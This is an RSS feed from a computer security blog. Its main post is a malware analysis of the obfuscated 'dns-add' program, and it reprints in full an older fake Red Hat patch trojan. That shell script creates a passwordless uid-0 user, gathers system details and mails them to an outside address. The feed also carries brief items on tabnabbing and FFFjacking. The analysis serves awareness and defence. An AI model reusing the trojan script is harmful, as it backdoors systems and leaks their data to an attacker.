@@ -1,0 +1,289 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>social engineering &#8211; Phocean.net</title>
+	<atom:link href="/blog-archive/tag/social-engineering/feed" rel="self" type="application/rss+xml" />
+	<link>/blog-archive</link>
+	<description>Computer Security Blog</description>
+	<lastBuildDate>Fri, 24 Feb 2017 21:17:51 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.9.10</generator>
+	<item>
+		<title>Tabnabbing</title>
+		<link>/blog-archive/2011/07/04/tabnabbing.html</link>
+		<pubDate>Mon, 04 Jul 2011 21:08:02 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Security]]></category>
+		<category><![CDATA[browser]]></category>
+		<category><![CDATA[phishing]]></category>
+		<category><![CDATA[social engineering]]></category>
+		<category><![CDATA[Tabnabbing]]></category>
+		<category><![CDATA[web]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=1147</guid>
+		<description><![CDATA[On his website, Aza Raskin calls it Tabnabbing. Don&#8217;t miss the video there and the test web page. It is so simple and probably efficient with most users. Certainly another dangerous phishing attack.]]></description>
+				<content:encoded><![CDATA[<p>On his website, Aza Raskin calls it <a title="Tabnabbing" href="http://www.azarask.in/blog/post/a-new-type-of-phishing-attack/" target="_blank">Tabnabbing</a>. Don&#8217;t miss the video there and the test web page. It is so simple and probably efficient with most users. Certainly another dangerous phishing attack.</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>FFFjacking</title>
+		<link>/blog-archive/2011/06/03/fffjacking.html</link>
+		<pubDate>Fri, 03 Jun 2011 17:39:56 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Pentesting]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[chrome]]></category>
+		<category><![CDATA[FFFjacking]]></category>
+		<category><![CDATA[firefox]]></category>
+		<category><![CDATA[Hijacking]]></category>
+		<category><![CDATA[IE]]></category>
+		<category><![CDATA[iFrame]]></category>
+		<category><![CDATA[social engineering]]></category>
+		<category><![CDATA[web browser]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=1085</guid>
+		<description><![CDATA[FFFjacking is new web browser hacking technique discovered by  Roman Kümmel (aka .cCuMiNn.). Even though it requires a little of social engineering, it is quite dangerous. Yet another string to add to the bow.]]></description>
+				<content:encoded><![CDATA[<p><a title="FFFjacking" href="http://www.soom.cz/index.php?name=articles/show&amp;aid=550" target="_blank">FFFjacking</a> is new web browser hacking technique discovered by  Roman Kümmel (aka .cCuMiNn.).</p>
+<p>Even though it requires a little of social engineering, it is quite dangerous. Yet another string to add to the bow.</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Beware of source code (even from your favorite portal/forum/&#8230;)</title>
+		<link>/blog-archive/2010/04/24/beware-of-source-code-even-from-your-favorite-portalforum.html</link>
+		<comments>/blog-archive/2010/04/24/beware-of-source-code-even-from-your-favorite-portalforum.html#comments</comments>
+		<pubDate>Sat, 24 Apr 2010 12:14:04 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Cryptography]]></category>
+		<category><![CDATA[Forensic]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Reversing]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[System]]></category>
+		<category><![CDATA[Bash]]></category>
+		<category><![CDATA[C]]></category>
+		<category><![CDATA[malware]]></category>
+		<category><![CDATA[obfuscation]]></category>
+		<category><![CDATA[RC4]]></category>
+		<category><![CDATA[shell]]></category>
+		<category><![CDATA[shellcode]]></category>
+		<category><![CDATA[social engineering]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=793</guid>
+		<description><![CDATA[The other day I stumbed upon a weired piece of software on howtoforge.com : dns-add (code on sourceforge.net). Actually, the purpose of dns-add was very intriguing : update your DNS in one command ! The output should look like this: ...::: ISP-fW DNS add v1.0 :::... http://isp-fw.sourceforge.net/ --== copyleft 2005-2006 ==-- &#124; Free memory: 864...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2010/04/24/beware-of-source-code-even-from-your-favorite-portalforum.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>The other day I stumbed upon a weired piece of software on <a title="Howtoforge.com" href="http://howtoforge.com" target="_blank">howtoforge.com</a> : <a title="dns-add" href="http://www.howtoforge.com/adding-dns-servers-in-one-step-with-dns-add" target="_blank">dns-add</a> (code <a title="Sourceforge dns-add" href="http://sourceforge.net/projects/isp-fw/files/DNS-add/" target="_blank">on sourceforge.net</a>).</p>
+<p>Actually, the purpose of dns-add was very intriguing : update your DNS in one command !</p>
+<p>The output should look like this:</p>
+<pre>...::: ISP-fW DNS add v1.0  :::... http://isp-fw.sourceforge.net/
+--== copyleft 2005-2006 ==-- | Free memory:         864
+contact isp.devel@gmail.com
+You can add up to 9 DNS servers, enter a number from [0-9]: 2
+Enter DNS1: 192.168.157.193
+Enter DNS2: 192.168.157.251
+Done adding 2 DNS!
+DNS 192.168.157.193 responded in 0.256 ms
+DNS 192.168.157.251 responded in 0.112 ms</pre>
+<p>Who would need it these days where all distros include tools and script to update the DNS with DHCP. At worst, it is just a matter of opening an editor to add two lines in <code>/etc/resolv.conf</code>. Done in 10 seconds.</p>
+<p>To enjoy dns-add, we are supposed to compile the source code. Let&#8217;s have a look at it first.</p>
+<p>It gets quickly obvious that there could be something nasty. The code is clearly obfuscated, to make it difficult to read:</p>
+<ul>
+<li>not much commented,</li>
+<li>a bunch of strange variables like &#8220;\026\243\314\376\220\366\154\166\346\334\005\116\360\114\015\231&#8221;. Could be the real code, hidden,</li>
+<li>None of the visible stuff seems to do anything on the DNS.</li>
+</ul>
+<p>So now, let&#8217;s try to find out what&#8217;s behind all that. As we have the source code, the idea is to understand what the code is doing, so that we can write a snippet at the right place to just read the deciphered and potentially malicious code. That&#8217;s the easiest way, no need to disassembly and do memory forensic.</p>
+<p>A good practice is to look for some pieces of code on the web, as developpers are lazy and often reuse already existing code. Doing that, you can save a lot of time.</p>
+<p>Bingo ! There is a code almost entirely identical <a title="RedHat update malware" href="http://packetstormsecurity.nl/0410-advisories/FakeRedhatPatchAnalysis.txt" target="_blank">there</a>.<br />
+We learn that the code, as old as 6 years old, actually hid a shell trojan instead of beeing a Red Hat update as claimed.</p>
+<p>There is clearly a risk, so we must check what the code of dns-add contains. Here more hints help us again about the encoding used : some comments and a function name mention RC4 (or ARC4).</p>
+<p>So let&#8217;s see how RC4 works and compare it with its possible implementation in dns-add.<br />
+Rougly, RC4 is just an improved XOR whith the help of a lot of keys permutations. I found a clear and short description <a title="RC4" href="http://www.frontiernet.net/~fys/cypher.htm" target="_blank">there</a> :</p>
+<blockquote><p>RC4 has two phases: key setup and ciphering.</p>
+<p>The key setup phase is only done once per message and starts by initializing the entire state array so that the first state element is zero, the second is one, the third is two, and so on.</p>
+<p>The state array is then subjected to 256 mixing operations using a loop that steps i through the values from zero to 255.</p>
+<p>Each mixing operation consists of two steps:<br />
+Add to the variable j the contents of the ith element of the state array and the nth element of the key, where n is equal to i modulo the length of the key.  (remember, the key here means the 10 byte IV at the front of the file, (or the one your program creates, if encoding), and the given key on the command line. (Key+IV)<br />
+Swap the ith and jth elements of the state array.</p>
+<p>After the entire mixing loop is completed, i and j are set to zero.</p>
+<p>During the ciphering operation, the following steps are performed for each byte of the message:</p>
+<p>The variable i is incremented by one<br />
+The contents of the ith element of &#8216;State&#8217; is then added to j<br />
+The ith and jth elements of &#8216;State&#8217; are swapped and their contents are added together to form a new value n.<br />
+The nth element of &#8216;State&#8217; is then combined with the message byte, using a bit by bit exclusive-or operation (XOR), to form the output byte.<br />
+The same ciphering steps are performed for encryption and for decryption.</p></blockquote>
+<p><strong><em>void key(void * str, int len)</em></strong> for setting the key setup phase and <strong><em>void arc4(void * str, int len, char *hint)</em></strong> for the deciphering phase do exactly what&#8217;s described above.</p>
+<p>They are called by <em><strong>char * xsh(int argc, char ** argv)</strong></em>, which we are going to look at carefully now.</p>
+<p>This function succevely setup all keys and decipher all the hardcoded vars. Note that a function, <strong><em>chkenv,</em></strong> setup a variable in the environment, based on the PID (and other tricks). It is not useful in the present case, but it could be developped further and used for example to avoid over-infections.</p>
+<p>What&#8217;s interesting is actually the bottom of the function, where the guy actually builds the shellcode, putting alltogether the pieces of deciphered code.</p>
+<pre>j = 0;
+varg[j++] = argv[0];		/* My own name at execution */
+if (ret && *opts)
+	varg[j++] = opts;	/* Options on 1st line of code */
+if (*inlo)
+	varg[j++] = inlo;	/* Option introducing inline code */
+varg[j++] = scrpt;		/* The script itself */
+if (*lsto)
+	varg[j++] = lsto;	/* Option meaning last option */
+i = (ret > 1) ? ret : 0;	/* Args numbering correction */
+while (i < argc)
+	varg[j++] = argv[i++];	/* Main run-time arguments */
+varg[j] = 0;			/* NULL terminated array */</pre>
+<p>Then, it is launched with execvp:</p>
+<pre>
+#if DEBUGEXEC
+debugexec(shll, j, varg);
+#endif
+execvp(shll, varg);
+return shll;
+</pre>
+<p><strong>Before testing further, it is safer to comment out the execvp line.</strong></p>
+<p>Now, we just need to retrieve the shellcode, so we just add this lazy piece of code (to insert right before #if DEBUGEXEC):</p>
+<pre>
+FILE *fout;
+char **tmp;
+tmp = varg;
+fout = fopen ("dns-test","w");
+do {
+  fprintf (fout, *tmp);
+}
+while (*tmp++ != NULL);
+fclose (fout);</pre>
+<p>Here we go :</p>
+<pre>
+$ ./dns-add
+$ cat shellcode
+./dns-add-c           <blank chars skipped>                    #!/bin/bash
+
+dnsfile="/etc/resolv.conf"
+failed='\e[1;31m'failed'\e[0m'
+ok='\e[1;34m'ok'\e[0m'
+
+function dns_add(){
+mv -f $dnsfile $dnsfile.back
+for (( i=1; i <= $dns_nr; i++ )) do
+    echo -n "Enter DNS${i}: "
+    read dns;
+    echo "nameserver $dns" >> $dnsfile;
+done
+echo "Done adding $dns_nr DNS!"
+echo
+for i in `cat $dnsfile | cut -d " " -f 2`; do
+    if [ `ping -c 1 $i | grep -c "100%"` -eq 1 ]; then
+            echo -e "DNS $i $failed to respond => request timeout :( "
+    else
+        echo -ne "DNS $i responded in ";
+        ping -c 1 $i | grep icmp_seq | cut -d "=" -f 4;
+    fi
+done
+}
+
+clear
+echo -e "...::: ISP-fW DNS add v1.0  :::...""\e[1m\e[36;40m" "http://isp-fw.sourceforge.net/\e[0m ";
+echo -e "--== copyleft 2005-2006 ==-- | Free memory: $(free -m|grep cache:|cut -d ":" -f2|cut -c12-22)";
+echo "contact isp.devel@gmail.com"
+echo
+echo -n "You can add up to 9 DNS servers, enter a number from [0-9]: ";
+read dns_nr;
+
+case $dns_nr in
+  [0-9]         ) dns_add;;
+  [[:lower:]]   ) echo "$dns_nr is not a number!";;
+  [[:upper:]]   ) echo "$dns_nr is not a number!";;
+  *             ) echo "$dns_nr is not a number!";;
+esac
+./dns-add</pre>
+<p>That's it. A big C file just for this lame shell script. The good news is that it does what it says. There is no malicious purpose, for now, it's nothing else than a (bad) joke.</p>
+<p>In the case of the original malware, it was more harmfull :</p>
+<pre>#!/bin/sh
+cd /tmp/
+clear
+if [ `id -u` != "0" ]
+then
+        echo "This patch must be applied as \"root\", and you are: \"`whoami`\""
+        exit
+fi
+echo "Identifying the system. This may take up to 2 minutes. Please wait ..."
+sleep 3
+if [ ! -d /tmp/." "/." "/." "/." "/." "/." "/." "/." "/." " ]; then
+ echo "Inca un root frate belea: " >> /tmp/mama
+ adduser -g 0 -u 0 -o bash >> /tmp/mama
+ passwd -d bash >> /tmp/mama
+ ifconfig >> /tmp/mama
+ uname -a >> /tmp/mama
+ uptime >> /tmp/mama
+ sshd >> /tmp/mama
+ echo "user bash stii tu" >> /tmp/mama
+ cat /tmp/mama | mail -s "Inca o roata" root@addlebrain.com >> /dev/null
+ rm -rf /tmp/mama
+ mkdir -p /tmp/." "/." "/." "/." "/." "/." "/." "/." "/." "
+fi
+
+bla()
+{
+  sleep 2
+  echo -n "#"
+  sleep 1
+  echo -n "#"
+  sleep 1
+  echo -n "#"
+  sleep 2
+  echo -n "#"
+  sleep 1
+  echo -n "#"
+  sleep 1
+  echo -n "#"
+  sleep 3
+  echo -n "#"
+  sleep 1
+  echo -n "#"
+  sleep 4
+  echo -n "#"
+  sleep 1
+  echo -n "#"
+  sleep 1
+  echo "#"
+  sleep 1
+}
+
+echo "System looks OK. Proceeding to next step."
+sleep 1
+echo
+echo -n "Patching \"ls\": "
+bla
+echo -n "Patching \"mkdir\": "
+bla
+echo
+echo "System updated and secured successfuly. You may erase these files."
+sleep 1
+./badexec 'exec '%s' "$@"' "$@"</pre>
+<p>Technically, at the end, it is rather basic. However, it is successful in the way that it hides its purpose to most people.<br />
+What's not clear yet is the poster purpose. Fun ? Any other weired feeling ? Or just testing the capacity of the community to detect maliscious software ? If so, was he just curious or does he have any future plan ?<br />
+Maybe I should ask him.</p>
+<p>Anyway, how many people opened and read the code ? Especially on a community driven website where people tend to have a dangerous feeling of trust and safety : it can't be malicious, the author offers the source code and nicely shares his work, right ?<br />
+And among the few people who checked the code, who really understood it ? Not everyone is an IT specialist. And even among them, not everyone is a developper or can read C.</p>
+<p>It highlights well several things :</p>
+<ul>
+<li><strong>social engineering is multi-platform ! </strong>We are often more vulnerable than our systems. Linux user or not.</li>
+<li><strong>software published with the source code doesn't mean safe software</strong>.</li>
+</ul>
+<p>As much as possible, download software exclusively from the official repositories of your favorite distribution (openSUSE ;)).<br />
+If you really have to use code from an untrusted source, check it, or wait for the right people to do it! Don't just grab any code, compile it and execute it blindly.</p>
+<p>At the same time as open-source software grows, we, users, and also websites like Sourceforge will have to be more carefull about the content we download.</p>
+<p><strong><span style="color: #ff0000;"><em><span style="color: #ff0000;">* Update *</span></em></span></strong></p>
+<p><em><span style="color: #993300;">I did contact the author and didn't get any answer.<br />
+I reported the issue to Sourceforge, which deleted the account hosting dns-add, as it violated the website policies.</span></em></p>
+<p><em><span style="color: #993300;">You can download the source code </span></em><a href="/blog-archive/wp-content/uploads/2010/04/dns-add.tar.gz"><em><span style="color: #0000ff;">dns-add.tar.gz</span></em></a><em><span style="color: #993300;"> if you want to analyse it.</span></em></p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2010/04/24/beware-of-source-code-even-from-your-favorite-portalforum.html/feed</wfw:commentRss>
+		<slash:comments>3</slash:comments>
+		</item>
+	</channel>
+</rss>
